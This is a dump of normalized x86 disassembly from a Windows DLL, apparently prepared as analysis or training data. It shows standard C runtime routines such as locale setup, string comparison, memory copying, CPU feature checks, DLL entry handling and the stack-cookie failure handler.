je r-xdata
cmp [ ebp - 0xa0 ] esi
je r-xdata
push 0x6
push ebx
push [ ebp - 0xa4 ]
call sub_1000ac80
add esp 0xc
mov eax [ ebp - 0xa0 ]
cmp eax esi
je r-xdata
xor eax eax
mov [ edi ] ax
mov [ edi + 0x2 ] ax
mov [ edi + 0x4 ] ax
mov eax [ ebp - 0xb4 ]
mov esi r--data
mov eax [ ebp - 0xb0 ]
cmp eax edi
jb r-xdata
push [ ebp - 0x98 ]
push [ ebp + 0x10 ]
push [ ebp - 0x9c ]
call sub_1001479b
add esp 0xc
test eax eax
je r-xdata
push 0x4
push [ ebp - 0xac ]
push [ ebp - 0xa0 ]
call sub_1000ac80
add esp 0xc
mov eax [ ebp - 0x9c ]
jmp r-xdata
mov [ eax ] esi
xor esi esi
push esi
push esi
push esi
push esi
push esi
call sub_1000e74b
add esp 0x14
jmp r-xdata
inc eax
push eax
push esi
push edi
push [ ebp - 0xa8 ]
call sub_100146e6
add esp 0x10
test eax eax
je r-xdata
mov eax [ ebp - 0x98 ]
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_1000e74b
add esp 0x14
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000ac69
leave
retn
cmp [ ebp - 0xa4 ] esi
je r-xdata
sub_1000cb13
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
mov ebx ecx
call sub_1000e343
push [ ebp + 0x8 ]
mov edi eax
lea eax [ ebp - 0x198 ]
push eax
lea eax [ ebp - 0x1b0 ]
push eax
push 0x83
lea eax [ ebp - 0x88 ]
push eax
push ebx
add edi 0x1d0
call sub_1000c8e2
add esp 0x18
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
shl eax 0x4
lea ebx [ eax + esi ]
push [ ebx + 0x48 ]
lea eax [ ebp - 0x88 ]
push eax
call sub_100123b0
pop ecx
pop ecx
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x48 ]
lea eax [ ebp - 0x88 ]
push eax
call sub_1000b9b0
add eax 0x5
push eax
mov [ ebp - 0x18c ] eax
call sub_100119e5
pop ecx
pop ecx
mov [ ebp - 0x190 ] eax
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_1000ac69
leave
retn
mov eax [ ebx + 0x48 ]
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x1a4 ] eax
lea eax [ esi + ecx * 4 + 0xc ]
add ecx 0x6
imul ecx ecx 0x6
mov [ ebp - 0x194 ] eax
mov eax [ eax ]
mov [ ebp - 0x1a8 ] eax
lea eax [ ecx + esi ]
push 0x6
push eax
mov [ ebp - 0x19c ] eax
lea eax [ ebp - 0x1c4 ]
push eax
call sub_1000ac80
mov eax [ esi + 0x4 ]
lea ecx [ ebp - 0x88 ]
push ecx
mov ecx [ ebp - 0x18c ]
mov [ ebp - 0x1b4 ] eax
mov eax [ ebp - 0x190 ]
add ecx 0xfffffffc
add eax 0x4
push ecx
push eax
call sub_1001479b
add esp 0x18
test eax eax
je r-xdata
mov eax [ ebp - 0x190 ]
mov ecx [ ebp - 0x194 ]
add eax 0x4
mov [ ebx + 0x48 ] eax
movzx eax [ ebp - 0x1b0 ]
mov [ ecx ] eax
push 0x6
lea eax [ ebp - 0x1b0 ]
push eax
push [ ebp - 0x19c ]
call sub_1000ac80
add esp 0xc
cmp [ ebp + 0x8 ] 0x2
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1000e74b
add esp 0x14
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
mov eax [ ebp - 0x198 ]
and [ ebp - 0x18c ] 0x0
mov [ esi + 0x4 ] eax
mov eax [ edi + 0x24 ]
mov ecx [ edi + 0x20 ]
mov [ ebp - 0x19c ] eax
mov eax edi
mov eax [ ebp + 0x8 ]
imul eax eax 0xc
push esi
call [ eax + r--data ]
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x198 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp - 0x18c ]
test eax eax
je r-xdata
mov edx [ eax ]
inc [ ebp - 0x18c ]
mov [ eax ] ecx
mov ecx [ ebp - 0x19c ]
mov [ ebp - 0x1bc ] edx
mov edx [ eax + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebp - 0x1bc ]
add eax 0x8
cmp [ ebp - 0x18c ] 0x5
mov [ ebp - 0x19c ] edx
jl r-xdata
cmp [ ebp - 0x1a4 ] rw-data
je r-xdata
mov eax [ ebp - 0x1a4 ]
push [ ebp - 0x190 ]
mov [ ebx + 0x48 ] eax
call sub_1000bf59
mov eax [ ebp - 0x1a8 ]
pop ecx
mov ecx [ ebp - 0x194 ]
mov [ ecx ] eax
mov eax [ ebp - 0x1b4 ]
mov [ esi + 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x18c ] 0x5
jne r-xdata
lea eax [ edi + eax * 8 ]
mov edx [ eax ]
mov [ edi ] edx
mov edx [ eax + 0x4 ]
mov [ edi + 0x4 ] edx
mov [ eax ] ecx
mov ecx [ ebp - 0x19c ]
mov [ eax + 0x4 ] ecx
mov edx [ esi + 0x4 ]
cmp edx [ eax ]
je r-xdata
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ebp - 0x190 ]
add ecx 0x5
shl ecx 0x4
mov [ eax ] 0x1
mov [ ecx + esi ] eax
mov eax [ ebp + 0x8 ]
add eax 0x5
shl eax 0x4
lea edi [ eax + esi ]
push [ edi ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax [ edi + 0x4 ]
mov [ esi + 0xa8 ] eax
push 0x1
push [ esi + 0x14 ]
lea eax [ ebp - 0x188 ]
push [ esi + 0x4 ]
push eax
push 0x7f
push r--data
push 0x1
push 0x0
call sub_100167e9
add esp 0x20
test eax eax
je r-xdata
push [ edi ]
call sub_1000bf59
push [ ebx + 0x54 ]
call sub_1000bf59
and [ ebx + 0x4c ] 0x0
pop ecx
pop ecx
and [ edi + 0x4 ] 0x0
xor eax eax
mov ecx 0x1ff
and [ ebp + eax * 2 - 0x188 ] cx
inc eax
cmp eax 0x7f
jb r-xdata
push 0xfe
push [ rw-data ]
lea eax [ ebp - 0x188 ]
push eax
call sub_10014faf
add esp 0xc
neg eax
sbb eax eax
inc eax
mov [ edi + 0x4 ] eax
jmp r-xdata
mov eax [ esi + 0x4 ]
mov [ edi ] eax
sub_1000ce15
mov edi edi
push ebp
mov ebp esp
sub esp 0x98
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
xor ebx ebx
mov esi edx
push edi
mov [ ebp - 0x98 ] esi
cmp eax ebx
je r-xdata
mov [ ebp - 0x90 ] 0x1
mov [ ebp - 0x8c ] ebx
cmp ecx ebx
je r-xdata
cmp ecx ebx
je r-xdata
call sub_1000c765
cmp [ ecx ] 0x4c
jne r-xdata
shl eax 0x4
mov eax [ eax + esi + 0x48 ]
jmp r-xdata
push eax
call sub_1000cb13
pop ecx
jmp r-xdata
push ebx
push ebx
push ebx
push 0x83
lea eax [ ebp - 0x88 ]
push eax
push ecx
call sub_1000c8e2
add esp 0x18
cmp eax ebx
je r-xdata
cmp [ ecx + 0x1 ] 0x43
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000ac69
leave
retn
lea edi [ esi + 0x48 ]
cmp [ ecx + 0x2 ] 0x5f
jne r-xdata
inc ebx
add edi 0x10
cmp ebx 0x5
jle r-xdata
push [ edi ]
lea eax [ ebp - 0x88 ]
push eax
call sub_100123b0
pop ecx
pop ecx
test eax eax
je r-xdata
mov edi ecx
test ebx ebx
je r-xdata
xor eax eax
cmp [ ebp - 0x90 ] eax
jne r-xdata
inc [ ebp - 0x8c ]
push ebx
lea ecx [ ebp - 0x88 ]
call sub_1000cb13
pop ecx
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
sub eax edi
mov [ ebp - 0x90 ] eax
je r-xdata
cmp [ ebp - 0x8c ] eax
je r-xdata
and [ ebp - 0x90 ] eax
jmp r-xdata
cmp [ ebx ] 0x3b
je r-xdata
mov [ ebp - 0x94 ] 0x1
mov esi r--data
jmp r-xdata
push eax
push edi
push [ esi ]
call sub_1001682b
add esp 0xc
test eax eax
jne r-xdata
inc [ ebp - 0x94 ]
add esi 0xc
cmp esi r--data
jle r-xdata
push [ esi ]
call sub_1000b9b0
pop ecx
cmp [ ebp - 0x90 ] eax
je r-xdata
mov eax [ ebp - 0x90 ]
inc ebx
push r--data
push ebx
call sub_100146a0
mov edi eax
xor esi esi
pop ecx
pop ecx
cmp edi esi
jne r-xdata
cmp [ ebp - 0x94 ] 0x5
jg r-xdata
cmp [ ebx ] 0x3b
jne r-xdata
add edi ebx
cmp [ edi ] 0x0
je r-xdata
push edi
push ebx
lea eax [ ebp - 0x88 ]
push 0x83
push eax
call sub_100146e6
add esp 0x10
test eax eax
je r-xdata
xor eax eax
cmp [ ebp - 0x8c ] eax
je r-xdata
inc edi
cmp [ edi ] 0x0
jne r-xdata
push [ ebp - 0x94 ]
mov esi [ ebp - 0x98 ]
lea ecx [ ebp - 0x88 ]
mov [ ebp + edi - 0x88 ] 0x0
call sub_1000cb13
pop ecx
test eax eax
je r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_1000e74b
add esp 0x14
mov esi [ ebp - 0x98 ]
jmp r-xdata
push r--data
push edi
call sub_100168f0
mov ebx eax
pop ecx
pop ecx
test ebx ebx
je r-xdata
inc [ ebp - 0x8c ]
sub_1000d030
push 0x14
push r--data
call sub_10011ecc
xor ebx ebx
mov [ ebp - 0x20 ] ebx
cmp [ ebp + 0x8 ] 0x5
jbe r-xdata
call sub_1000e343
mov esi eax
mov [ ebp - 0x1c ] esi
call sub_1000c4c6
or [ esi + 0x70 ] 0x10
mov [ ebp - 0x4 ] ebx
push 0x1
push 0xd8
call sub_10011a2a
pop ecx
pop ecx
mov edi eax
mov [ ebp - 0x24 ] edi
cmp edi ebx
je r-xdata
call sub_1000e8db
mov [ eax ] 0x16
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1000e873
add esp 0x14
xor eax eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000d19b
mov eax [ ebp - 0x20 ]
push 0xc
call sub_100129fe
pop ecx
mov [ ebp - 0x4 ] 0x1
mov ecx [ esi + 0x6c ]
mov eax edi
call sub_1000c462
mov [ ebp - 0x4 ] ebx
call sub_1000d15e
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov edx edi
call sub_1000ce15
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax ebx
je r-xdata
call sub_10011f11
retn
push edi
call sub_1000c3c9
push edi
call sub_1000c1f1
pop ecx
pop ecx
cmp [ ebp + 0xc ] ebx
je r-xdata
push 0xc
call sub_100129fe
pop ecx
mov [ ebp - 0x4 ] 0x2
lea ebx [ esi + 0x6c ]
mov eax ebx
call sub_1000c488
push edi
call sub_1000c3c9
pop ecx
test [ esi + 0x70 ] 0x2
jne r-xdata
push rw-data
push [ ebp + 0xc ]
call sub_100123b0
pop ecx
pop ecx
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_1000d16a
jmp r-xdata
test [ rw-data ] 0x1
jne r-xdata
mov [ rw-data ] 0x1
mov edi [ ebx ]
mov eax rw-data
call sub_1000c488
push 0x18
mov eax [ rw-data ]
add eax 0xc
push eax
push rw-data
call sub_1000ac80
add esp 0xc
call sub_1000c53c
sub_1000d1ab
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov dx [ ebp + 0xc ]
jmp r-xdata
movzx ecx [ eax ]
test cx cx
jne r-xdata
cmp cx dx
je r-xdata
cmp [ eax ] dx
je r-xdata
pop ebp
retn
inc eax
inc eax
xor eax eax
sub_1000d1d1
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
xor esi esi
xor eax eax
push edi
cmp [ ebp + 0x10 ] esi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov ebx [ ebp + 0x8 ]
cmp ebx esi
jne r-xdata
mov edi [ ebp + 0xc ]
cmp edi esi
je r-xdata
call sub_1000e8db
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_1000e873
add esp 0x14
mov eax 0x7fffffff
jmp r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_1000afe5
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] esi
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ ebx ]
push eax
call sub_1000e687
movzx esi ax
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ edi ]
push eax
call sub_1000e687
add esp 0x10
inc ebx
inc ebx
inc edi
inc edi
dec [ ebp + 0x10 ]
movzx eax ax
je r-xdata
movzx eax [ ebx ]
cmp ax 0x41
jb r-xdata
movzx ecx ax
movzx eax si
sub eax ecx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test si si
je r-xdata
movzx esi ax
movzx eax [ edi ]
cmp ax 0x41
jb r-xdata
cmp ax 0x5a
ja r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp si ax
je r-xdata
inc ebx
inc ebx
inc edi
inc edi
dec [ ebp + 0x10 ]
movzx eax ax
je r-xdata
cmp ax 0x5a
ja r-xdata
add eax 0x20
test si si
je r-xdata
add eax 0x20
cmp si ax
je r-xdata
jmp r-xdata
sub_1000d2bb
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
push edi
cmp [ rw-data ] esi
jne r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000d1d1
add esp 0x10
xor eax eax
cmp [ ebp + 0x10 ] esi
je r-xdata
pop edi
pop esi
pop ebp
retn
mov edi [ ebp + 0x8 ]
cmp edi esi
jne r-xdata
mov edx [ ebp + 0xc ]
cmp edx esi
je r-xdata
call sub_1000e8db
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_1000e873
add esp 0x14
mov eax 0x7fffffff
jmp r-xdata
movzx eax [ edi ]
cmp ax 0x41
jb r-xdata
movzx ecx ax
movzx eax [ edx ]
cmp ax 0x41
jb r-xdata
cmp ax 0x5a
ja r-xdata
inc edi
inc edi
inc edx
inc edx
dec [ ebp + 0x10 ]
movzx eax ax
je r-xdata
cmp ax 0x5a
ja r-xdata
add eax 0x20
movzx edx ax
movzx eax cx
sub eax edx
jmp r-xdata
cmp cx si
je r-xdata
add eax 0x20
cmp cx ax
je r-xdata
sub_1000d361
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push edi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
push 0x1
push 0x0
push 0x0
push [ ebp - 0x4 ]
call sub_100169a0
sub eax [ rw-data ]
mov ecx [ ebp - 0x8 ]
sbb edx [ rw-data ]
xor edi edi
push edi
add eax ecx
push 0x2710
adc edx edi
push edx
push eax
call sub_10016930
pop edi
leave
retn
sub_1000d3a6
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
push 0x1
push 0x0
push 0x0
push [ ebp - 0x4 ]
call sub_100169a0
mov ecx [ ebp - 0x8 ]
xor esi esi
add eax ecx
adc edx esi
mov [ rw-data ] eax
mov [ rw-data ] edx
xor eax eax
pop esi
leave
retn
sub_1000d3df
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push edi
cmp eax 0x1
jne r-xdata
xor edi edi
cmp eax edi
jne r-xdata
push eax
call sub_100127de
pop ecx
test eax eax
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ rw-data ] edi
jle r-xdata
call sub_1000e4fa
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
cmp eax 0x3
jne r-xdata
call sub_1000e155
push 0x214
push 0x1
call sub_10011a2a
mov esi eax
pop ecx
pop ecx
cmp esi edi
je r-xdata
dec [ rw-data ]
cmp [ rw-data ] edi
jne r-xdata
call sub_10017295
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_1001715e
mov [ rw-data ] eax
call sub_10016b89
test eax eax
jge r-xdata
call sub_1001280e
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0xc
xor eax eax
inc eax
push edi
call sub_1000e48c
pop ecx
push esi
push [ rw-data ]
push [ rw-data ]
call sub_1000e0ba
pop ecx
call eax
test eax eax
je r-xdata
cmp [ ebp + 0x10 ] edi
jne r-xdata
call sub_10011e6f
call sub_100170a3
test eax eax
jl r-xdata
call sub_1000e1a6
jmp r-xdata
push esi
call sub_1000bf59
pop ecx
jmp r-xdata
push edi
push esi
call sub_1000e1e3
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
call sub_10016ddd
call sub_1000e1a6
call sub_1001280e
jmp r-xdata
call sub_10016ddd
jmp r-xdata
call sub_10016e2b
test eax eax
jl r-xdata
push 0x0
call sub_10011ca8
pop ecx
test eax eax
jne r-xdata
inc [ rw-data ]
jmp r-xdata
sub_1000d514
push 0xc
push r--data
call sub_10011ecc
mov edi ecx
mov esi edx
mov ebx [ ebp + 0x8 ]
xor eax eax
inc eax
mov [ ebp - 0x1c ] eax
test esi esi
jne r-xdata
and [ ebp - 0x4 ] 0x0
cmp esi eax
je r-xdata
cmp [ rw-data ] edx
je r-xdata
mov eax [ r--data ]
test eax eax
je r-xdata
cmp esi 0x2
jne r-xdata
xor eax eax
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push edi
push esi
push ebx
call eax
mov [ ebp - 0x1c ] eax
push edi
push esi
push ebx
call sub_100030ab
mov [ ebp - 0x1c ] eax
cmp esi 0x1
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
push edi
push esi
push ebx
call sub_1000d3df
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
test esi esi
je r-xdata
test eax eax
jne r-xdata
push edi
push esi
push ebx
call sub_1000d3df
test eax eax
jne r-xdata
cmp esi 0x3
jne r-xdata
push edi
push eax
push ebx
call sub_100030ab
push edi
push 0x0
push ebx
call sub_1000d3df
mov eax [ r--data ]
test eax eax
je r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
and [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
jmp r-xdata
push edi
push 0x0
push ebx
call eax
mov eax [ r--data ]
test eax eax
je r-xdata
call sub_10011f11
retn
push edi
push esi
push ebx
call eax
mov [ ebp - 0x1c ] eax
_start
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x1
jne r-xdata
push [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_1000d514
pop ecx
pop ebp
retn 0xc
call sub_100172e1
sub_1000d62d
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x320 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x328 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x324 ] eax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
push 0x1
call sub_10017377
pop ecx
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push r--data
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
push 0xc0000409
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
leave
retn
push 0x1
call sub_10017377
pop ecx
sub_1000d733
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] esi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
shr ecx 0x7
jmp r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec ecx
jne r-xdata
mov esi [ ebp - 0x8 ]
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_1000d7ba
push ebp
mov ebp esp
sub esp 0x1c
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] ebx
mov ebx [ ebp + 0xc ]
mov eax ebx
cdq
mov ecx eax
mov eax [ ebp + 0x8 ]
xor ecx edx
sub ecx edx
and ecx 0xf
xor ecx edx
sub ecx edx
cdq
mov edi eax
xor edi edx
sub edi edx
and edi 0xf
xor edi edx
sub edi edx
mov edx ecx
or edx edi
jne r-xdata
cmp ecx edi
jne r-xdata
mov esi [ ebp + 0x10 ]
mov ecx esi
and ecx 0x7f
mov [ ebp - 0x18 ] ecx
cmp esi ecx
je r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
neg ecx
add ecx 0x10
mov [ ebp - 0x1c ] ecx
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp - 0x1c ]
[ edi ] [ esi ]
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x1c ]
mov edx [ ebp + 0xc ]
add edx [ ebp - 0x1c ]
mov eax [ ebp + 0x10 ]
sub eax [ ebp - 0x1c ]
push eax
push edx
push ecx
call sub_1000d7ba
add esp 0xc
mov eax [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
je r-xdata
sub esi ecx
push esi
push ebx
push eax
call sub_1000d733
add esp 0xc
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x18 ]
mov ebx [ ebp - 0x4 ]
mov esi [ ebp - 0x8 ]
mov edi [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
mov ebx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
add edx ebx
sub edx ecx
mov [ ebp - 0x14 ] edx
add ebx eax
sub ebx ecx
mov [ ebp - 0x10 ] ebx
mov esi [ ebp - 0x14 ]
mov edi [ ebp - 0x10 ]
mov ecx [ ebp - 0x18 ]
[ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
sub_1000d8ed
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
xor eax eax
push ebx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
push ebx
pushfd
pop eax
mov ecx eax
xor eax 0x200000
push eax
popfd
pushfd
pop edx
sub edx ecx
je r-xdata
pop ebx
test [ ebp - 0x4 ] 0x4000000
je r-xdata
push ecx
popfd
xor eax eax
cpuid
mov [ ebp - 0xc ] eax
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x10 ] ecx
mov eax 0x1
cpuid
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
call sub_1000d89d
test eax eax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
pop ebx
leave
retn
sub_1000d95c
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_1000d98b
mov edi edi
push esi
push edi
mov esi eax
push 0x101
xor edi edi
lea eax [ esi + 0x1c ]
push edi
push eax
call sub_1000b660
xor eax eax
movzx ecx ax
mov eax ecx
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
shl ecx 0x10
or eax ecx
lea edi [ esi + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov ecx rw-data
add esp 0xc
lea eax [ esi + 0x1c ]
sub ecx esi
mov edi 0x101
mov dl [ ecx + eax ]
mov [ eax ] dl
inc eax
dec edi
jne r-xdata
lea eax [ esi + 0x11d ]
mov esi 0x100
mov dl [ eax + ecx ]
mov [ eax ] dl
inc eax
dec esi
jne r-xdata
pop edi
pop esi
retn
sub_1000d9ef
mov edi edi
push ebp
mov ebp esp
sub esp 0x51c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
lea eax [ ebp - 0x518 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
mov edi 0x100
test eax eax
je r-xdata
lea eax [ esi + 0x11d ]
mov [ ebp - 0x51c ] 0xffffff9f
xor ecx ecx
sub [ ebp - 0x51c ] eax
xor eax eax
cmp edx 0x19
ja r-xdata
or [ esi + ecx + 0x1d ] 0x10
mov dl cl
add dl 0x20
jmp r-xdata
mov [ ebp + eax - 0x104 ] al
inc eax
cmp eax edi
jb r-xdata
mov al [ ebp - 0x512 ]
mov [ ebp - 0x104 ] 0x20
test al al
je r-xdata
mov [ eax ] 0x0
or [ esi + ecx + 0x1d ] 0x20
mov dl cl
sub dl 0x20
mov [ eax ] dl
jmp r-xdata
push 0x0
push [ esi + 0xc ]
lea eax [ ebp - 0x504 ]
push [ esi + 0x4 ]
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x1
push 0x0
call sub_100167e9
xor ebx ebx
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x204 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push edi
push [ esi + 0xc ]
push ebx
call sub_10017724
add esp 0x44
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x304 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x200
push [ esi + 0xc ]
push ebx
call sub_10017724
add esp 0x24
xor eax eax
lea ebx [ ebp - 0x511 ]
mov edx [ ebp - 0x51c ]
lea eax [ esi + ecx + 0x11d ]
add edx eax
lea ebx [ edx + 0x20 ]
cmp ebx 0x19
ja r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_1000ac69
leave
retn
inc ecx
cmp ecx edi
jb r-xdata
test cl 0x2
je r-xdata
or [ esi + eax + 0x1d ] 0x10
mov cl [ ebp + eax - 0x204 ]
jmp r-xdata
inc ebx
mov al [ ebx ]
inc ebx
test al al
jne r-xdata
sub eax ecx
inc eax
push eax
lea edx [ ebp + ecx - 0x104 ]
push 0x20
push edx
call sub_1000b660
add esp 0xc
mov [ esi + eax + 0x11d ] 0x0
or [ esi + eax + 0x1d ] 0x20
mov cl [ ebp + eax - 0x304 ]
mov [ esi + eax + 0x11d ] cl
jmp r-xdata
movzx ecx al
movzx eax [ ebx ]
cmp ecx eax
ja r-xdata
movzx ecx [ ebp + eax * 2 - 0x504 ]
test cl 0x1
je r-xdata
jmp r-xdata
inc eax
cmp eax edi
jb r-xdata
sub_1000db82
push 0xc
push r--data
call sub_10011ecc
call sub_1000e343
mov edi eax
mov eax [ rw-data ]
test [ edi + 0x70 ] eax
je r-xdata
push 0xd
call sub_100129fe
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0x68 ]
mov [ ebp - 0x1c ] esi
cmp esi [ rw-data ]
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000dc1d
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x68 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x68 ] eax
mov esi [ rw-data ]
mov [ ebp - 0x1c ] esi
push esi
call [ InterlockedIncrement@IAT ]
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax esi
call sub_10011f11
retn
push 0x20
call sub_10011be9
pop ecx
cmp esi rw-data
je r-xdata
push esi
call sub_1000bf59
pop ecx
sub_1000dc26
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push ebx
lea ecx [ ebp - 0x10 ]
call sub_1000afe5
mov [ rw-data ] ebx
cmp esi 0xfffffffe
jne r-xdata
cmp esi 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
